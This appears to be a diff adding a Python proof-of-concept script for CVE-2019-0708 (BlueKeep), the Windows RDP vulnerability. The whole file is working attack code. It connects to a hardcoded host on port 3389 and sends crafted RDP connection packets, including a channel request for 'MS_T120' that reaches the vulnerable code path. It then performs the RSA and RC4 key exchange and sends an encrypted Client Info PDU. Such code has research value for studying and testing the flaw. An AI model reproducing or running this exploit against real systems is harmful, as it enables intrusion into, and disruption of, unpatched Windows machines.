@@ -1,0 +1,384 @@
+#CVE-2019-0708
+#the most worst PoC for only hitting vulnerable path NOT DOS!!!!! by Mateusz Garncarek
+#https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/e78db616-689f-4b8a-8a99-525f7a433ee2
+#https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-RDPBCGR/%5bMS-RDPBCGR%5d.pdf
+
+import socket
+import sys
+import struct
+import hashlib
+
+
+def macData(macSaltKey, data):
+    """
+    @see: http://msdn.microsoft.com/en-us/library/cc241995.aspx
+    @param macSaltKey: {str} mac key
+    @param data: {str} data to sign
+    @return: {str} signature
+    """
+    sha1Digest = hashlib.sha1()
+    md5Digest = hashlib.md5()
+    
+    #encode length
+    dataLength = len(data)
+    dataLength = struct.pack('<I',dataLength)
+    b36 = b"\x36" * 40
+    
+    
+    sha1Digest.update(macSaltKey)
+    sha1Digest.update(b36)
+    sha1Digest.update(dataLength)
+    sha1Digest.update(data)
+    
+    sha1Sig = sha1Digest.digest()
+
+    b5c = b"\x5c" * 48
+    
+    md5Digest.update(macSaltKey)
+    md5Digest.update(b5c)
+    md5Digest.update(sha1Sig)
+    
+    return md5Digest.digest()
+
+
+def crypt(key, data):
+    S = list(range(256))
+    j = 0
+
+    for i in list(range(256)):
+        j = (j + S[i] + ord(key[i % len(key)])) % 256
+        S[i], S[j] = S[j], S[i]
+
+    j = 0
+    y = 0
+    out = []
+
+    for char in data:
+        j = (j + 1) % 256
+        y = (y + S[j]) % 256
+        S[j], S[y] = S[y], S[j]
+
+        
+        out.append(chr(ord(char) ^ S[(S[j] + S[y]) % 256]))
+
+    return ''.join(out)
+
+
+def SaltedHash(Secret, I,client_random,server_random):
+    md5 = hashlib.md5()
+    sha1 = hashlib.sha1()
+
+
+
+    Secretb = bytearray()
+    Secretb.extend(map(ord, Secret))
+
+
+
+    Ib = bytearray()
+    Ib.extend(map(ord, I))
+
+    client_randomb = bytearray()
+    client_randomb.extend(map(ord, client_random))
+
+    
+    server_randomb = bytearray()
+    server_randomb.extend(map(ord, server_random))
+    
+  
+    sha1.update(Ib+Secretb+client_randomb+server_randomb)
+    md5.update(Secretb+sha1.digest())
+    return md5.digest()
+
+
+def finalHash(key, client_random, server_random):
+    """
+    @summary: MD5(in0[:16] + in1[:32] + in2[:32])
+    @param key: in 16
+    @param random1: in 32
+    @param random2: in 32
+    @return MD5(in0[:16] + in1[:32] + in2[:32])
+    """
+    client_randomb = bytearray()
+    client_randomb.extend(map(ord, client_random))
+    server_randomb = bytearray()
+    server_randomb.extend(map(ord, server_random))
+    md5Digest = md5 = hashlib.md5()
+
+    
+    md5Digest.update(key)
+    md5Digest.update(client_randomb)
+    md5Digest.update(server_randomb)
+    return md5Digest.digest()
+
+#Hardcoded Client Info PDU
+packet_to_encrypt = b""
+packet_to_encrypt +=b"\x00\x00\x00\x00\x5B\x01\x01\x00\x00\x00\x08\x00\x08\x00\x00"
+packet_to_encrypt +=b"\x00\x00\x00\x00\x00\x74\x00\x65\x00\x73\x00\x74\x00\x00\x00"
+packet_to_encrypt +=b"\x74\x00\x65\x00\x73\x00\x74\x00\x00\x00\x00\x00\x00\x00\x02"
+packet_to_encrypt +=b"\x00\x02\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+packet_to_encrypt +=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+packet_to_encrypt +=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+packet_to_encrypt +=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+packet_to_encrypt +=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+packet_to_encrypt +=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+packet_to_encrypt +=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+packet_to_encrypt +=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+packet_to_encrypt +=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+packet_to_encrypt +=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+packet_to_encrypt +=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+packet_to_encrypt +=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+packet_to_encrypt +=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+
+
+client_random = b""
+
+client_random += b"\xff\xee\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+client_random += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff"
+
+
+host = '192.168.195.131'
+port = 3389
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+
+s.connect((host, port))
+
+received_data = ""
+
+packet1 = b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x00\x00\x00\x00"
+
+
+s.send(packet1)
+received_data  = s.recv(10024)
+
+
+print("1st packet sent")
+
+#Initial PDU with GCC Conference Create Request
+PDU = "\x03\x00\x01\xca\x02\xf0\x80\x7f\x65\x82\x01\xb2\x04\x01"
+PDU += "\x01\x04\x01\x01\x01\x01\xff\x30\x19\x02\x01\x22\x02\x01\x02\x02\x01\x00\x02"
+PDU += "\x01\x01\x02\x01\x00\x02\x01\x01\x02\x02\xff\xff\x02\x01\x02\x30\x19\x02\x01"
+PDU += "\x01\x02\x01\x01\x02\x01\x01\x02\x01\x01\x02\x01\x00\x02\x01\x01\x02\x02\x04"
+PDU += "\x20\x02\x01\x02\x30\x1c\x02\x02\xff\xff\x02\x02\xfc\x17\x02\x02\xff\xff\x02"
+PDU += "\x01\x01\x02\x01\x00\x02\x01\x01\x02\x02\xff\xff\x02\x01\x02\x04\x82\x01\x51"
+PDU += "\x00\x05\x00\x14\x7c\x00\x01\x81\x48\x00\x08\x00\x10\x00\x01\xc0\x00\x44\x75"
+PDU += "\x63\x61\x81\x3a\x01\xc0\xea\x00\x0b\x00\x08\x00\x80\x07\x38\x04\x01\xca\x03"
+
+PDU += "\xaa\x15\x04\x00\x00\x63\x45\x00\x00\x44\x00\x45\x00\x53\x00\x4b\x00\x54\x00"
+PDU += "\x4f\x00\x50\x00\x2d\x00\x37\x00\x39\x00\x46\x00\x56\x00\x56\x00\x30\x00\x43"
+PDU += "\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00"
+PDU += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+PDU += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+PDU += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+
+PDU += "\x00\x00\x00\x01\xca\x01\x00\x00\x00\x00\x00\x18\x00\x0f\x00\xaf\x07\x35\x00"
+
+PDU += "\x65\x00\x37\x00\x37\x00\x63\x00\x33\x00\x39\x00\x35\x00\x2d\x00\x66\x00\x30"
+PDU += "\x00\x37\x00\x32\x00\x2d\x00\x34\x00\x63\x00\x37\x00\x36\x00\x2d\x00\x62\x00"
+PDU += "\x31\x00\x65\x00\x63\x00\x2d\x00\x66\x00\x36\x00\x32\x00\x66\x00\x65\x00\x37"
+PDU += "\x00\x33\x00\x00\x00\x07\x00\x00\x00\x00\x00\x58\x01\x00\x00\xc1\x00\x00\x00"
+PDU += "\x00\x00\x64\x00\x00\x00\x64\x00\x00\x00\x04\xc0\x0c\x00\x15\x00\x00\x00\x00"
+PDU += "\x00\x00\x00\x02\xc0\x0c\x00\x1b\x00\x00\x00\x00\x00\x00\x00\x03\xc0\x38\x00"
+
+
+#count of channels
+PDU += "\x06\x00\x00\x00"
+
+#channels
+PDU += "rdpdr" + "\x00\x00\x00" + "\x00\x00\x80\x80"
+PDU += "rdpsnd"+"\x00\x00" + "\x00\x00\x00\xc0"
+PDU += "cliprdr"+ "\x00"+ "\x00\x00\xa0\xc0"
+PDU += "AAAAAAA" + "\x00" + "\x00\x00\x00\x80"
+PDU += "MS_T120" + "\x00" + "\x00\x00\x00\x80"
+PDU += "drdynvc"  + "\x00"+ "\x00\x00\x80\xc0"
+
+
+
+length_packet = len(PDU)
+print(length_packet)
+
+#stupid calculating length for ASN.1 xD
+ber = length_packet-12
+ber2  = length_packet-109
+ber3  =  length_packet-118
+ber4  =  length_packet-132
+ber5 =    length_packet-390
+
+
+
+length_packetb = struct.pack(">h", length_packet)
+
+berb = length_packet = struct.pack(">h", ber)
+ber2b  = length_packet = struct.pack(">h", ber2)
+ber3b  =  length_packet = struct.pack(">h", ber3)
+ber4b  = length_packet = struct.pack(">h", ber4)
+ber5b =   length_packet = struct.pack(">h", ber5)
+
+
+#even more worse calculating length for ASN.1 xD
+PDU_b = bytearray()
+PDU_b.extend(map(ord, PDU))
+
+PDU_b[2] = length_packetb[0]
+PDU_b[3] = length_packetb[1]
+
+PDU_b[10] = berb[0]
+PDU_b[11] = berb[1]
+
+
+PDU_b[107] = ber2b[0]
+PDU_b[108] = ber2b[1]
+#hardcoded high part of length xDDDDDDDDd
+PDU_b[116] = 0x81
+PDU_b[117] = ber3b[1] 
+#hardcoded high part of length xDDDDDDDDd
+PDU_b[130] = 0x81
+PDU_b[131] = ber4b[1]
+PDU_b[392] = ber5b[1]
+
+
+s.send(PDU_b)
+received_data = s.recv(1024)
+
+#more hardcoded things xDDDDDDDDd
+server_random = received_data[121:153]
+modulus = received_data[189:253]
+public_exponent =  received_data[185:189]
+
+
+
+#print(modulus)
+
+
+print("Initial PDU sent")
+
+
+
+#modulus_b = bytearray()
+#modulus_b.extend(map(ord, modulus))
+
+
+#Obtaining things for RSA 
+modulus = int.from_bytes(modulus, byteorder='little')
+public_exponent = int.from_bytes(public_exponent, byteorder='little')
+client_random = int.from_bytes(client_random, byteorder='little')
+
+
+
+#Encrypting client radom 
+
+encrypted_client_random = pow(client_random,public_exponent,modulus )
+encrypted_client_random  = encrypted_client_random.to_bytes(64, byteorder='little')
+
+
+####Begin of connecting virtual channels, it's also hardcoded xD
+packet3 = b"\x03\x00\x00\x0c\x02\xf0\x80\x04\x01\x00\x01\x00"
+s.send(packet3)
+print("3rd packet sent")
+
+
+packet4 = b"\x03\x00\x00\x08\x02\xf0\x80\x28"
+s.send(packet4)
+received_data  = s.recv(1024)
+print("4th packet sent")
+
+
+packet5 = b"\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x08\x03\xf1"
+s.send(packet5)
+received_data  = s.recv(1024)
+print("5th packet sent")
+
+
+packet6 = b"\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x08\x03\xeb"
+s.send(packet6)
+received_data  = s.recv(1024)
+print("6th packet sent")
+
+
+packet7 = b"\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x08\x03\xec"
+s.send(packet7)
+received_data  = s.recv(1024)
+
+
+
+packet8 = b"\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x08\x03\xed"
+s.send(packet8)
+received_data  = s.recv(1024)
+
+
+packet9 = b"\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x08\x03\xee"
+s.send(packet9)
+received_data  = s.recv(1024)
+
+
+packet10 = b"\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x08\x03\xef"
+s.send(packet10)
+received_data  = s.recv(1024)
+
+
+
+packet11= b"\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x08\x03\xf0"
+s.send(packet11)
+received_data  = s.recv(1024)
+###########End of connecting virtual channels
+
+
+#Client Security Exchange PDU
+
+PDU_Security_Exchange = b"\x03\x00\x00\x5e\x02\xf0\x80\x64\x00\x08\x03\xeb\x70\x50\x01\x02\x00\x00\x48\x00\x00\x00"
+PDU_Security_Exchange += encrypted_client_random
+PDU_Security_Exchange  += b"\x00\x00\x00\x00\x00\x00\x00\x00"
+
+
+
+
+
+client_random  = client_random.to_bytes(32, byteorder='little')
+client_random = "".join(map(chr, client_random))
+server_random = "".join(map(chr, server_random))
+
+#Calculating hashes and things for RC4 encryption it's only done for 128BIT RC4
+PreMasterSecret = client_random[:24] + server_random[:24]
+MasterSecret = SaltedHash(PreMasterSecret,"A",client_random,server_random) +  SaltedHash(PreMasterSecret,"BB",client_random,server_random) + SaltedHash(PreMasterSecret,"CCC",client_random,server_random)
+MasterSecret = "".join(map(chr, MasterSecret))
+SessionKeyBlob = SaltedHash(MasterSecret,"X",client_random,server_random) +  SaltedHash(MasterSecret,"YY",client_random,server_random) + SaltedHash(MasterSecret,"ZZZ",client_random,server_random)
+FinalClientEncryptKey128 = SessionKeyBlob[32:48]
+FinalClientEncryptKey128 = finalHash(FinalClientEncryptKey128,client_random,server_random)
+
+print(':'.join(hex(x)[2:] for x in FinalClientEncryptKey128))
+
+
+MACKey128 = SessionKeyBlob[:16]
+
+#print(':'.join(hex(x)[2:] for x in MACKey128))
+
+FinalClientEncryptKey128 = "".join(map(chr, FinalClientEncryptKey128))
+FinalMac128 = macData(MACKey128, packet_to_encrypt)[:8]
+packet_to_encrypt = "".join(map(chr, packet_to_encrypt))
+encrypted_packet = crypt(FinalClientEncryptKey128,packet_to_encrypt)
+
+
+encrypted_packetb = bytearray()
+encrypted_packetb.extend(map(ord, encrypted_packet))
+
+#print(':'.join(hex(ord(x))[2:] for x in encrypted_packet))
+ 
+
+
+#Client Info PDU together with #Client Security Exchange PDU
+Client_Info_PDU =  b""
+Client_Info_PDU += PDU_Security_Exchange
+Client_Info_PDU += b"\x03\x00\x01\x05\x02\xf0\x80\x64\x00\x03\x03\xeb\x70\x80\xf6\x48\x00\x00\x00"
+Client_Info_PDU += FinalMac128
+Client_Info_PDU += encrypted_packetb
+
+
+s.send(Client_Info_PDU)
+received_data  = s.recv(1024)
+print("Last packet sent")
+
+
+
